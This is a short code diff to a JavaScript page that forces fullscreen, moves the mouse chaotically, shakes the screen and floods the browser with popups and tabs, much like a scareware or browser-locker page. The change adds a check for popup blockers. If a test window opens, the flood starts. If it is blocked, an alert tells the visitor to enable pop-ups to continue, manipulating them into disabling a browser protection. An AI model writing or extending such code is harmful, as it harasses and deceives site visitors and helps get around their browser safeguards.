@@ -123,7 +123,8 @@
             // Request fullscreen
             enterFullScreen();
 
-            startPopupsAndTabs(); // Start opening popups and tabs
+            checkPopups(); // Check for pop-up blocker
+
             chaoticMouseMovement();
             startScreenShake(); 
 
@@ -173,6 +174,17 @@
             ];
             const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
             console.log(randomMessage);
+        }
+
+        function checkPopups() {
+            const testPopup = window.open("", "_blank"); // Attempt to open a blank pop-up
+            
+            if (testPopup) {
+                testPopup.close(); // Close the pop-up if it opened successfully
+                startPopupsAndTabs(); // Start the opening of tabs
+            } else {
+                alert("Please enable pop-ups to continue to this site."); // Alert if blocked
+            }
         }
 
         function startPopupsAndTabs() {
